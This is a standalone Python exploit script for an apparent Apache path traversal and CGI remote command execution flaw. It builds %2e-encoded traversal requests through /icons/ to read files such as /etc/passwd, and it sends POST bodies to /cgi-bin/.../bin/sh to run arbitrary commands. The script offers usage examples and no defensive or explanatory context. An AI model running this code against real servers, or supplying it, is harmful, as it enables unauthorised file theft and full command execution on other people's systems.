import socket
import sys

def send_request(host, port, request):
    # Create a socket object
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # Connect to the server
        s.connect((host, port))
        # Send the HTTP request
        s.sendall(request.encode())
        # Receive the response
        response = s.recv(4096)
    return response.decode()

def exploit_path_traversal(target_url, file_path):
    host, port = target_url.split(":")
    port = int(port) if port else 80
    
    # Construct the HTTP GET request for path traversal
    path = f"/icons/.%2e/%2e%2e/%2e%2e/%2e%2e{file_path}"
    request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
    
    response = send_request(host, port, request)
    print(f"Path Traversal Response:\n{response}")

def exploit_command_execution(target_url, command):
    host, port = target_url.split(":")
    port = int(port) if port else 80
    
    # Construct the HTTP POST request for command execution
    path = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
    payload = f"echo;{command}"
    request = (f"POST {path} HTTP/1.1\r\n"
               f"Host: {host}\r\n"
               f"Content-Length: {len(payload)}\r\n"
               f"Content-Type: application/x-www-form-urlencoded\r\n"
               f"Connection: close\r\n\r\n"
               f"{payload}")
    
    response = send_request(host, port, request)
    print(f"Command Execution Response:\n{response}")

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("Usage: python exploit.py [TARGET_URL] [PATH] [COMMAND]")
        print("Example: python exploit.py localhost:8080 /etc/passwd")
        print("Or for command execution: python exploit.py localhost:8080 /bin/sh echo;id")
        sys.exit(1)
    
    target_url = sys.argv[1]
    path_or_command = sys.argv[2]

    if len(sys.argv) == 4:
        command = sys.argv[3]
        exploit_command_execution(target_url, command)
    else:
        exploit_path_traversal(target_url, path_or_command)
